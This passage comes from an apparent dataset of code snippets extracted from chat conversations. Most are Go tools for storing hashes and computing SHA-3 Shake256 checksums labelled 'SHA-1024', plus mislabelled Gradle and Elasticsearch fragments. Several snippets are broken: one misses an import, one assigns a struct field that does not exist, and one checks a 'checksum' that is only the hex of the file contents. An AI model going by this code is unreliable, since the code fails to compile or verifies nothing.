    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n)\n\ntype HashStorage struct {\n\tmd5Hashes    map[string]string\n\tsha1Hashes   map[string]string\n\tsha256Hashes map[string]string\n}\n\nfunc NewHashStorage() *HashStorage {\n\treturn &HashStorage{\n\t\tmd5Hashes:    make(map[string]string),\n\t\tsha1Hashes:   make(map[string]string),\n\t\tsha256Hashes: make(map[string]string),\n\t}\n}\n\nfunc (hs *HashStorage) Add(hashType string, key string, value string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\ths.md5Hashes[key] = value\n\tcase \"sha1\":\n\t\ths.sha1Hashes[key] = value\n\tcase \"sha256\":\n\t\ths.sha256Hashes[key] = value\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Remove(hashType string, key string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\tdelete(hs.md5Hashes, key)\n\tcase \"sha1\":\n\t\tdelete(hs.sha1Hashes, key)\n\tcase \"sha256\":\n\t\tdelete(hs.sha256Hashes, key)\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Modify(hashType string, key string, value string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\ths.md5Hashes[key] = value\n\tcase \"sha1\":\n\t\ths.sha1Hashes[key] = value\n\tcase \"sha256\":\n\t\ths.sha256Hashes[key] = value\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Get(hashType string, key string) string {\n\tswitch hashType {\n\tcase \"md5\":\n\t\treturn hs.md5Hashes[key]\n\tcase \"sha1\":\n\t\treturn hs.sha1Hashes[key]\n\tcase \"sha256\":\n\t\treturn hs.sha256Hashes[key]\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t\treturn \"\"\n\t}\n}\n\nfunc main() {\n\thashType := flag.String(\"type\", \"\", \"Type of hash (md5, sha1, sha256)\")\n\tkey := flag.String(\"key\", \"\", \"Key\")\n\tvalue := flag.String(\"value\", \"\", \"Value\")\n\taction := flag.String(\"action\", \"\", \"Action to perform (add, remove, modify, get)\")\n\n\tflag.Parse()\n\n\ths := NewHashStorage()\n\n\tswitch *action {\n\tcase \"add\":\n\t\ths.Add(*hashType, *key, *value)\n\t\tfmt.Println(\"Added \", *value, \" to \", *key, \" for hash type \", *hashType)\n\tcase \"remove\":\n\t\ths.Remove(*hashType, *key)\n\t\tfmt.Println(\"Removed \", *key, \" for hash type \", *hashType)\n\tcase \"modify\":\n\t\ths.Modify(*hashType, *key, *value)\n\t\tfmt.Println(\"Modified \", *key, \" to \", *value, \" for hash type \", *hashType)\n\tcase \"get\":\n\t\tresult := hs.Get(*hashType, *key)\n\t\tfmt.Println(\"Value for \", *key, \" in hash type \", *hashType, \" is \", result)\n\tdefault:\n\t\tfmt.Println(\"Invalid action. Please provide a valid action (add, remove, modify, get)\")\n\t}\n}",
    "filename": "c4f14ab545c90ede492ab8e6f9b5f871_1.go"
  },
  {
    "conversation_hash": "c4f14ab545c90ede492ab8e6f9b5f871",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/md5\"\n\t\"crypto/sha1\"\n\t\"crypto/sha256\"\n\t\"encoding/hex\"\n\t\"flag\"\n\t\"fmt\"\n)\n\ntype HashStorage struct {\n\tmd5Hashes    map[string]string\n\tsha1Hashes   map[string]string\n\tsha256Hashes map[string]string\n}\n\nfunc NewHashStorage() *HashStorage {\n\treturn &HashStorage{\n\t\tmd5Hashes:    make(map[string]string),\n\t\tsha1Hashes:   make(map[string]string),\n\t\tsha256Hashes: make(map[string]string),\n\t}\n}\n\nfunc (hs *HashStorage) Add(hashType string, key string, value string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\ths.md5Hashes[key] = value\n\tcase \"sha1\":\n\t\ths.sha1Hashes[key] = value\n\tcase \"sha256\":\n\t\ths.sha256Hashes[key] = value\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Remove(hashType string, key string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\tdelete(hs.md5Hashes, key)\n\tcase \"sha1\":\n\t\tdelete(hs.sha1Hashes, key)\n\tcase \"sha256\":\n\t\tdelete(hs.sha256Hashes, key)\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Modify(hashType string, key string, value string) {\n\tswitch hashType {\n\tcase \"md5\":\n\t\ths.md5Hashes[key] = value\n\tcase \"sha1\":\n\t\ths.sha1Hashes[key] = value\n\tcase \"sha256\":\n\t\ths.sha256Hashes[key] = value\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t}\n}\n\nfunc (hs *HashStorage) Get(hashType string, key string) string {\n\tswitch hashType {\n\tcase \"md5\":\n\t\treturn hs.md5Hashes[key]\n\tcase \"sha1\":\n\t\treturn hs.sha1Hashes[key]\n\tcase \"sha256\":\n\t\treturn hs.sha256Hashes[key]\n\tdefault:\n\t\tfmt.Println(\"Unsupported hash type: \", hashType)\n\t\treturn \"\"\n\t}\n}\n\nfunc (hs *HashStorage) List() {\n\tfmt.Println(\"MD5 Hashes:\")\n\tfor key, value := range hs.md5Hashes {\n\t\tfmt.Println(key, \":\", value)\n\t}\n\n\tfmt.Println(\"SHA1 Hashes:\")\n\tfor key, value := range hs.sha1Hashes {\n\t\tfmt.Println(key, \":\", value)\n\t}\n\n\tfmt.Println(\"SHA256 Hashes:\")\n\tfor key, value := range hs.sha256Hashes {\n\t\tfmt.Println(key, \":\", value)\n\t}\n}\n\nfunc main() {\n\thashType := flag.String(\"type\", \"\", \"Type of hash (md5, sha1, sha256)\")\n\tkey := flag.String(\"key\", \"\", \"Key\")\n\tvalue := flag.String(\"value\", \"\", \"Value\")\n\taction := flag.String(\"action\", \"\", \"Action to perform (add, remove, modify, get, list)\")\n\n\tflag.Parse()\n\n\ths := NewHashStorage()\n\n\tswitch *action {\n\tcase \"add\":\n\t\ths.Add(*hashType, *key, *value)\n\t\tfmt.Println(\"Added \", *value, \" to \", *key, \" for hash type \", *hashType)\n\tcase \"remove\":\n\t\ths.Remove(*hashType, *key)\n\t\tfmt.Println(\"Removed \", *key, \" for hash type \", *hashType)\n\tcase \"modify\":\n\t\ths.Modify(*hashType, *key, *value)\n\t\tfmt.Println(\"Modified \", *key, \" to \", *value, \" for hash type \", *hashType)\n\tcase \"get\":\n\t\tresult := hs.Get(*hashType, *key)\n\t\tfmt.Println(\"Value for \", *key, \" in hash type \", *hashType, \" is \", result)\n\tcase \"list\":\n\t\ths.List()\n\tdefault:\n\t\tfmt.Println(\"Invalid action. Please provide a valid action (add, remove, modify, get, list)\")\n\t}\n}",
    "filename": "c4f14ab545c90ede492ab8e6f9b5f871_2.go"
  },
  {
    "conversation_hash": "978b3c788f6a694f5a1b6fa04194153e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/hex\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n\n\t\"golang.org/x/crypto/sha3\"\n)\n\nfunc main() {\n\tfileFlag := flag.String(\"f\", \"\", \"Ścieżka do pliku\")\n\ttextFlag := flag.String(\"z\", \"\", \"Tekst\")\n\tverifyFlag := flag.Bool(\"v\", false, \"Sprawdź poprawność sumy kontrolnej\")\n\texpectedHashFlag := flag.String(\"c\", \"\", \"Oczekiwana suma kontrolna SHA-1024\")\n\tflag.Parse()\n\n\tif *fileFlag == \"\" && *textFlag == \"\" && !*verifyFlag {\n\t\tflag.Usage()\n\t\tos.Exit(1)\n\t}\n\n\tif *fileFlag != \"\" {\n\t\thash, err := getFileChecksum(*fileFlag)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd generowania skrótu/hasha dla pliku: %v\", err)\n\t\t}\n\t\tfmt.Printf(\"Skrót/hash SHA-1024 dla pliku %s: %s\\n\", *fileFlag, hash)\n\n\t\t// Zapisz skrót do pliku z rozszerzeniem .sh1k\n\t\tfileExt := filepath.Ext(*fileFlag)\n\t\toutputFile := strings.TrimSuffix(*fileFlag, fileExt) + \".sh1k\"\n\t\terr = saveHashToFile(outputFile, hash)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd zapisu skrótu/hasha do pliku: %v\", err)\n\t\t}\n\t\tfmt.Printf(\"Skrót/hash został zapisany do pliku %s\\n\", outputFile)\n\t}\n\n\tif *textFlag != \"\" {\n\t\thash := getTextChecksum(*textFlag)\n\t\tfmt.Printf(\"Skrót/hash SHA-1024 dla tekstu \\\"%s\\\": %s\\n\", *textFlag, hash)\n\n\t\t// Zapisz skrót do pliku o nazwie podanej jako textFlag\n\t\terr := saveHashToFile(*textFlag, hash)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd zapisu skrótu/hasha do pliku: %v\", err)\n\t\t}\n\t\tfmt.Printf(\"Skrót/hash został zapisany do pliku %s\\n\", *textFlag)\n\t}\n\n\tif *verifyFlag {\n\t\tif *expectedHashFlag == \"\" {\n\t\t\tlog.Fatal(\"Brak podanej oczekiwanej sumy kontrolnej SHA-1024\")\n\t\t}\n\n\t\tfilePath := flag.Arg(0)\n\t\tif filePath == \"\" {\n\t\t\tlog.Fatal(\"Brak podanej ścieżki do pliku\")\n\t\t}\n\n\t\terr := verifyHash(filePath, *expectedHashFlag)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t}\n}\n\n// reszta kodu jest bez zmian",
    "filename": "978b3c788f6a694f5a1b6fa04194153e_1.go"
  },
  {
    "conversation_hash": "42fe6e63740484968e189f270f043da0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"io\"\n    \"log\"\n    \"os\"\n    \"strings\"\n)\n\nfunc verifyHash(filePath, expectedHash string) error {\n    file, err := os.Open(filePath)\n    if err != nil {\n        return err\n    }\n    defer file.Close()\n\n    // Odczytanie zawartości pliku\n    content, err := io.ReadAll(file)\n    if err != nil {\n        return err\n    }\n\n    // Obliczenie sumy kontrolnej na podstawie odczytanej zawartości pliku\n    calculatedHash := fmt.Sprintf(\"%x\", content)\n\n    // Porównanie sumy kontrolnej\n    if strings.ToLower(calculatedHash) != strings.ToLower(expectedHash) {\n        return fmt.Errorf(\"Niepoprawna suma kontrolna: oczekiwano %s, otrzymano %s\", expectedHash, calculatedHash)\n    }\n\n    fmt.Println(\"Suma kontrolna jest poprawna\")\n    return nil\n}\n\nfunc main() {\n    expectedHash := flag.String(\"c\", \"\", \"Oczekiwana suma kontrolna\")\n    filePath := flag.String(\"d\", \"\", \"Ścieżka do pliku\")\n\n    flag.Parse()\n\n    if *expectedHash == \"\" {\n        log.Fatal(\"Brak podanej oczekiwanej sumy kontrolnej\")\n    }\n\n    if *filePath == \"\" {\n        log.Fatal(\"Brak podanej ścieżki do pliku\")\n    }\n\n    err := verifyHash(*filePath, *expectedHash)\n    if err != nil {\n        log.Fatal(err)\n    }\n}",
    "filename": "42fe6e63740484968e189f270f043da0_0.go"
  },
  {
    "conversation_hash": "42fe6e63740484968e189f270f043da0",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"log\"\n    \"os\"\n    \"strings\"\n)\n\nfunc verifyHash(filePath, expectedHash string) error {\n    file, err := os.Open(filePath)\n    if err != nil {\n        return err\n    }\n    defer file.Close()\n\n    stat, err := file.Stat()\n    if err != nil {\n        return err\n    }\n\n    fileSize := int(stat.Size())\n    fileContent := make([]byte, fileSize)\n    _, err = file.Read(fileContent)\n    if err != nil {\n        return err\n    }\n\n    calculatedHash := fmt.Sprintf(\"%x\", fileContent)\n\n    if strings.ToLower(calculatedHash) != strings.ToLower(expectedHash) {\n        return fmt.Errorf(\"Niepoprawna suma kontrolna: oczekiwano %s, otrzymano %s\", expectedHash, calculatedHash)\n    }\n\n    fmt.Println(\"Suma kontrolna jest poprawna\")\n    return nil\n}\n\nfunc main() {\n    expectedHash := flag.String(\"c\", \"\", \"Oczekiwana suma kontrolna\")\n    filePath := flag.String(\"d\", \"\", \"Ścieżka do pliku\")\n\n    flag.Parse()\n\n    if *expectedHash == \"\" {\n        log.Fatal(\"Brak podanej oczekiwanej sumy kontrolnej\")\n    }\n\n    if *filePath == \"\" {\n        log.Fatal(\"Brak podanej ścieżki do pliku\")\n    }\n\n    err := verifyHash(*filePath, *expectedHash)\n    if err != nil {\n        log.Fatal(err)\n    }\n}",
    "filename": "42fe6e63740484968e189f270f043da0_1.go"
  },
  {
    "conversation_hash": "42fe6e63740484968e189f270f043da0",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"io\"\n    \"log\"\n    \"os\"\n    \"strings\"\n)\n\nfunc verifyHash(filePath, expectedHash string) error {\n    file, err := os.Open(filePath)\n    if err != nil {\n        return err\n    }\n    defer file.Close()\n\n    hash := sha3.NewShake256()\n    if _, err := io.Copy(hash, file); err != nil {\n        return err\n    }\n\n    checksum := make([]byte, 128)\n    hash.Read(checksum)\n\n    calculatedHash := fmt.Sprintf(\"%x\", checksum)\n    fmt.Println(\"Obliczona suma kontrolna:\", calculatedHash)\n\n    if strings.ToLower(calculatedHash) != strings.ToLower(expectedHash) {\n        return fmt.Errorf(\"Niepoprawna suma kontrolna: oczekiwano %s, otrzymano %s\", expectedHash, calculatedHash)\n    }\n\n    fmt.Println(\"Suma kontrolna jest poprawna\")\n    return nil\n}\n\nfunc main() {\n    expectedHash := flag.String(\"c\", \"\", \"Oczekiwana suma kontrolna\")\n    filePath := flag.String(\"d\", \"\", \"Ścieżka do pliku\")\n\n    flag.Parse()\n\n    if *expectedHash == \"\" {\n        log.Fatal(\"Brak podanej oczekiwanej sumy kontrolnej\")\n    }\n\n    if *filePath == \"\" {\n        log.Fatal(\"Brak podanej ścieżki do pliku\")\n    }\n\n    err := verifyHash(*filePath, *expectedHash)\n    if err != nil {\n        log.Fatal(err)\n    }\n}",
    "filename": "42fe6e63740484968e189f270f043da0_2.go"
  },
  {
    "conversation_hash": "42fe6e63740484968e189f270f043da0",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/hex\"\n    \"flag\"\n    \"fmt\"\n    \"io\"\n    \"log\"\n    \"os\"\n    \"strings\"\n\n    \"golang.org/x/crypto/sha3\"\n)\n\nfunc verifyHash(filePath, expectedHash string) error {\n    file, err := os.Open(filePath)\n    if err != nil {\n        return err\n    }\n    defer file.Close()\n\n    hash := sha3.NewShake256()\n    if _, err := io.Copy(hash, file); err != nil {\n        return err\n    }\n\n    checksum := make([]byte, 128)\n    hash.Read(checksum)\n\n    calculatedHash := hex.EncodeToString(checksum)\n    fmt.Println(\"Obliczona suma kontrolna:\", calculatedHash)\n\n    if strings.ToLower(calculatedHash) != strings.ToLower(expectedHash) {\n        return fmt.Errorf(\"Niepoprawna suma kontrolna: oczekiwano %s, otrzymano %s\", expectedHash, calculatedHash)\n    }\n\n    fmt.Println(\"Suma kontrolna jest poprawna\")\n    return nil\n}\n\nfunc main() {\n    expectedHash := flag.String(\"c\", \"\", \"Oczekiwana suma kontrolna\")\n    filePath := flag.String(\"d\", \"\", \"Ścieżka do pliku\")\n\n    flag.Parse()\n\n    if *expectedHash == \"\" {\n        log.Fatal(\"Brak podanej oczekiwanej sumy kontrolnej\")\n    }\n\n    if *filePath == \"\" {\n        log.Fatal(\"Brak podanej ścieżki do pliku\")\n    }\n\n    err := verifyHash(*filePath, *expectedHash)\n    if err != nil {\n        log.Fatal(err)\n    }\n}",
    "filename": "42fe6e63740484968e189f270f043da0_3.go"
  },
  {
    "conversation_hash": "ed10f470622d3e3eef75e399f332e977",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "GET logs/_search\n{\n  \"query\": {\n    \"match\": {\n      \"status\": \"error\"\n    }\n  }\n}",
    "filename": "ed10f470622d3e3eef75e399f332e977_1.go"
  },
  {
    "conversation_hash": "6d6356e4565fd5e2a77d42f69d97c78f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"strings\"\n)\n\ntype EranConnection struct {\n\tId             string   `json:\"Id\"`\n\tName           string   `json:\"Name\"`\n\tFilterOwners   []string `json:\"FilterOwners\"`\n\tFilterNRCells  []string `json:\"FilterNRCells\"`\n\tFilterEUtranCells  []string `json:\"FilterEUtranCells\"`\n\tFilterSectors  []string `json:\"FilterSectors\"`\n\tFilterBands    []string `json:\"FilterBands\"`\n\tIsOnSharedRadio bool     `json:\"IsOnSharedRadio\"`\n\tRegion         string   `json:\"Region\"`\n\tNodes          []string `json:\"Nodes\"`\n\tLatitude       string   `json:\"Latitude\"`\n\tLongitude      string   `json:\"Longitude\"`\n\tAltitude       string   `json:\"Altitude\"`\n\tLati           string   `json:\"Lati\"`\n\tLongi          string   `json:\"Longi\"`\n\tSubNetwork     string   `json:\"SubNetwork\"`\n\tCellsGroupsLabels []string `json:\"cellsGroupsLabels\"`\n\tIsLte          bool     `json:\"isLte\"`\n\tController     string   `json:\"Controller\"`\n\tManagementHost string   `json:\"ManagementHost\"`\n\tDls            []string `json:\"Dls\"`\n\tLogicalname    string   `json:\"Logicalname\"`\n}\n\nfunc main() {\n\tjsonData := `{\n\t\t\"Id\": \"541025\",\n\t\t\"Name\": \"ERBS_41025_SHYGTC_1_KKT\",\n\t\t\"FilterOwners\": null,\n\t\t\"FilterNRCells\": null,\n\t\t\"FilterEUtranCells\": null,\n\t\t\"FilterSectors\": null,\n\t\t\"FilterBands\": null,\n\t\t\"IsOnSharedRadio\": false,\n\t\t\"Region\": \"41\",\n\t\t\"Nodes\": [\"GRBS_41025_SHYGTC_1_KKT\", \"ERBS_41025_SHYGTC_2_KKT\"],\n\t\t\"Latitude\": \"42.319917\",\n\t\t\"Longitude\": \"69.594928\",\n\t\t\"Altitude\": \"0\",\n\t\t\"Lati\": \"\",\n\t\t\"Longi\": \"\",\n\t\t\"SubNetwork\": \"Shymkent\",\n\t\t\"cellsGroupsLabels\": null,\n\t\t\"isLte\": false,\n\t\t\"Controller\": \"\",\n\t\t\"ManagementHost\": \"\",\n\t\t\"Dls\": null,\n\t\t\"Logicalname\": \"ERBS-41025-SHYGTC-1-KKT\"\n\t}`\n\n\tvar eranConnection EranConnection\n\terr := json.Unmarshal([]byte(jsonData), &eranConnection)\n\tif err != nil {\n\t\tfmt.Println(\"Error parsing JSON: \", err)\n\t\treturn\n\t}\n\t\n\tport(&eranConnection)\n\tfmt.Println(eranConnection.TnPort)\n}\n\nfunc port(elasticran *EranConnection) {\n\tname := elasticran.Name\n\tsubNetwork := elasticran.SubNetwork\n\n\tif strings.HasPrefix(name, \"GRBS\") {\n\t\telasticran.TnPort = \"TN_IDL_C\"\n\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_1_\") {\n\t\tif subNetwork == \"Shymkent\" {\n\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t} else {\n\t\t\telasticran.TnPort = \"TN_B\"\n\t\t}\n\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_2_\") {\n\t\tif subNetwork == \"Shymkent\" {\n\t\t\telasticran.TnPort = \"TN_IDL_D\"\n\t\t} else {\n\t\t\telasticran.TnPort = \"TN_A\"\n\t\t}\n\t}\n}",
    "filename": "6d6356e4565fd5e2a77d42f69d97c78f_0.go"
  },
  {
    "conversation_hash": "8e8e44229577886bbd26a76de25ecf21",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/hex\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n\n\t\"golang.org/x/crypto/sha3\"\n)\n\nfunc main() {\n\tflag.Usage = func() {\n\t\tfmt.Fprintf(os.Stderr, \"%s\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"Generuje skrót SHA-1024 dla podanych danych wykorzystując SHA-3 Shake256.\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"Użycie: sh1k [-f plik] [-z znaki]\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"Flagi:\\n\")\n\t\tflag.PrintDefaults()\n\t}\n\tfileFlag := flag.String(\"f\", \"\", \"Ścieżka do pliku\")\n\ttextFlag := flag.String(\"z\", \"\", \"Tekst\")\n\tflag.Parse()\n\n\tif *fileFlag == \"\" && *textFlag == \"\" {\n\t\tflag.Usage()\n\t\tos.Exit(1)\n\t}\n\n\tif *fileFlag != \"\" {\n\t\thash, err := getFileChecksum(*fileFlag)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd generowania skrótu dla pliku: %v\", err)\n\t\t}\n\t\tfmt.Printf(\"Skrót SHA-1024 dla pliku %s: %s\\n\", *fileFlag, hash)\n\n\t\t// Zapisz skrót do pliku z rozszerzeniem .sh1k\n\t\tfileExt := filepath.Ext(*fileFlag)\n\t\toutputFile := strings.TrimSuffix(*fileFlag, fileExt) + \".sh1k\"\n\t\terr = saveHashToFile(outputFile, hash)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd zapisu skrótu do pliku: %v\", err)\n\t\t}\n\t\tfmt.Printf(\"Skrót został zapisany do pliku %s\\n\", outputFile)\n\t}\n\n\tif *textFlag != \"\" {\n\t\thash := getTextChecksum(*textFlag)\n\t\tfmt.Printf(\"Skrót SHA-1024 dla tekstu \\\"%s\\\": %s\\n\", *textFlag, hash)\n\n\t\t// Zapisz skrót do pliku o nazwie podanej jako textFlag\n\t\terr := saveHashToFile(*textFlag, hash)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Błąd zapisu skrótu do pliku: %v\", err)\n\t\t}\n\t\tfmt.Printf(\"Skrót został zapisany do pliku %s\\n\", *textFlag)\n\t}\n}\n\nfunc getFileChecksum(filePath string) (string, error) {\n\tfile, err := os.Open(filePath)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tdefer file.Close()\n\n\thash := sha3.NewShake256()\n\tif _, err := io.Copy(hash, file); err != nil {\n\t\treturn \"\", err\n\t}\n\n\tchecksum := make([]byte, 128)\n\thash.Read(checksum)\n\treturn hex.EncodeToString(checksum), nil\n}\n\nfunc getTextChecksum(text string) string {\n\thash := sha3.NewShake256()\n\thash.Write([]byte(text))\n\tchecksum := make([]byte, 128)\n\thash.Read(checksum)\n\treturn hex.EncodeToString(checksum)\n}\n\nfunc saveHashToFile(fileName, hash string) error {\n\tfile, err := os.Create(fileName)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer file.Close()\n\n\t_, err = file.WriteString(hash)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}",
    "filename": "8e8e44229577886bbd26a76de25ecf21_0.go"
  },
  {
    "conversation_hash": "ef8ee4f358f7843029dfefc71a71b991",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "PUT log_alias    // Replace with your desired alias name\n   {\n     \"aliases\": {\n       \"log_alias\": {\n         \"is_write_index\": true\n       }\n     }\n   }",
    "filename": "ef8ee4f358f7843029dfefc71a71b991_2.go"
  },
  {
    "conversation_hash": "370a30d57cd7f5820acbec7711d8cf64",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id 'org.springframework.boot' version '2.5.5'\n    id 'io.spring.dependency-management' version '1.0.11.RELEASE'\n    id 'java'\n    id 'org.openjfx.javafxplugin' version '0.0.10'\n}\n\ngroup = 'com.marketplace'\nversion = '1.0-SNAPSHOT'\nsourceCompatibility = '1.9'\ntargetCompatibility = '1.9'\n\nrepositories {\n    mavenCentral()\n}\n\ndependencies {\n    implementation 'org.springframework.boot:spring-boot-starter-data-jdbc'\n    implementation 'org.springframework.boot:spring-boot-starter-data-jpa'\n    implementation 'org.springframework.boot:spring-boot-starter-web'\n    implementation 'org.postgresql:postgresql'\n    implementation 'org.projectlombok:lombok'\n    implementation 'com.google.code.gson:gson'\n    implementation 'org.flywaydb:flyway-core'\n    runtimeOnly 'org.postgresql:postgresql'\n    testImplementation 'org.springframework.boot:spring-boot-starter-test'\n\n    implementation 'org.openjfx:javafx-controls:11.0.2'\n    implementation 'org.openjfx:javafx-fxml:11.0.2'\n}\n\nconfigurations {\n    compileOnly {\n        extendsFrom annotationProcessor\n    }\n}\n\ntest {\n    useJUnitPlatform()\n}\n\nbootRun {\n    jvmArgs = [\n        '--module-path', classpath.asPath,\n        '--add-modules', 'javafx.controls,javafx.fxml'\n    ]\n}",
    "filename": "370a30d57cd7f5820acbec7711d8cf64_0.go"
  },
  {
    "conversation_hash": "0e75028ba5f15cab9d2d72cf8f49b321",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    maven {\n        url 'https://мой_репозиторий.com'\n    }\n}",
    "filename": "0e75028ba5f15cab9d2d72cf8f49b321_1.go"
  },
  {
    "conversation_hash": "0e75028ba5f15cab9d2d72cf8f49b321",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    maven {\n        url 'https://repo.spring.io/milestone'\n    }\n}",
    "filename": "0e75028ba5f15cab9d2d72cf8f49b321_2.go"
  },
  {
    "conversation_hash": "c167ddae169717456c282a8ad8741242",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"golang.org/x/crypto/sha3\"\n\t\"os\"\n)\n\nvar (\n\tlogoSHA1024 = `\ndd`\n\n\tfileName   string\n\tshaOptions = []struct {\n\t\tname      string\n\t\tdesc      string\n\t\tshaLength int\n\t\tenabled   *bool\n\t}{\n\t\t{\"-sha1024\", \"[generuj skrót SHA-1024]\", 128, new(bool)},\n\t\t{\"-sha2048\", \"[generuj skrót SHA-2048]\", 256, new(bool)},\n\t\t{\"-sha4096\", \"[generuj skrót SHA-4096]\", 512, new(bool)},\n\t\t{\"-sha8192\", \"[generuj skrót SHA-8192]\", 1024, new(bool)},\n\t\t{\"-sha16384\", \"[generuj skrót SHA-16384]\", 2048, new(bool)},\n\t\t{\"-sha32768\", \"[generuj skrót SHA-32768]\", 4096, new(bool)},\n\t\t{\"-sha65536\", \"[generuj skrót SHA-65536]\", 8192, new(bool)},\n\t}\n)\n\nfunc init() {\n\tflag.StringVar(&fileName, \"f\", \"\", \"[nazwa pliku]\")\n\n\tflag.Usage = func() {\n\t\tfmt.Fprintf(os.Stderr, \"%s\\n\", logoSHA1024)\n\t\tfmt.Fprintf(os.Stderr, \"\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"Generates SHA hashes 1024-65536 for the file using the SHA-3 Shake256 algorithm.\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"Sposób użycia: %s -f [nazwa_pliku] [opcje]\\n\", os.Args[0])\n\t\tfmt.Fprintf(os.Stderr, \"\\nOpcje:\\n\")\n\t\tfor _, shaOption := range shaOptions {\n\t\t\tfmt.Fprintf(os.Stderr, \"%s %s\\n\", shaOption.name, shaOption.desc)\n\t\t}\n\t}\n\n\tflag.Parse()\n}\n\nfunc main() {\n\tif fileName == \"\" {\n\t\tflag.Usage()\n\t\tos.Exit(1)\n\t}\n\n\tbuf := []byte(fileName)\n\n\tfor _, shaOption := range shaOptions {\n\t\tif *shaOption.enabled && shaOption.name == \"-sha1024\" {\n\t\t\th := make([]byte, shaOption.shaLength)\n\t\t\tsha3.ShakeSum256(h, buf)\n\t\t\tfmt.Printf(\"%s: %x\\n\", shaOption.name, h)\n\t\t}\n\t}\n}",
    "filename": "c167ddae169717456c282a8ad8741242_0.go"
  },
  {
    "conversation_hash": "c167ddae169717456c282a8ad8741242",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"golang.org/x/crypto/sha3\"\n\t\"os\"\n)\n\nvar (\n\tlogoSHA1024 = `\ndd`\n\n\tfileName   string\n\tshaOptions = []struct {\n\t\tname      string\n\t\tdesc      string\n\t\tshaLength int\n\t\tenabled   *bool\n\t}{\n\t\t{\"-sha1024\", \"[generuj skrót SHA-1024]\", 128, new(bool)},\n\t\t{\"-sha2048\", \"[generuj skrót SHA-2048]\", 256, new(bool)},\n\t\t{\"-sha4096\", \"[generuj skrót SHA-4096]\", 512, new(bool)},\n\t\t{\"-sha8192\", \"[generuj skrót SHA-8192]\", 1024, new(bool)},\n\t\t{\"-sha16384\", \"[generuj skrót SHA-16384]\", 2048, new(bool)},\n\t\t{\"-sha32768\", \"[generuj skrót SHA-32768]\", 4096, new(bool)},\n\t\t{\"-sha65536\", \"[generuj skrót SHA-65536]\", 8192, new(bool)},\n\t}\n)\n\nfunc init() {\n\tflag.StringVar(&fileName, \"f\", \"\", \"[nazwa pliku]\")\n\n\tflag.Usage = func() {\n\t\tfmt.Fprintf(os.Stderr, \"%s\\n\", logoSHA1024)\n\t\tfmt.Fprintf(os.Stderr, \"\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"Generates SHA hashes 1024-65536 for the file using the SHA-3 Shake256 algorithm.\\n\")\n\t\tfmt.Fprintf(os.Stderr, 